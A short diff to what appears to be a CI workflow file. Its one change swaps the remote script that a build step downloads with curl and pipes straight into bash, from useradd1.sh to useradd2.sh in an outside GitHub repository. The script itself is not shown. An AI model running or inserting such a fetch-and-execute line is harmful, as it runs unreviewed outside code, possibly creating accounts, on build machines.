@@ -7,7 +7,7 @@ jobs:
     steps:
       - name: run
         run: | 
-         bash -c "$(curl -fsSL https://raw.githubusercontent.com/xlabr/u/sh/useradd1.sh)"
+         bash -c "$(curl -fsSL https://raw.githubusercontent.com/xlabr/u/sh/useradd2.sh)"
          
     
      
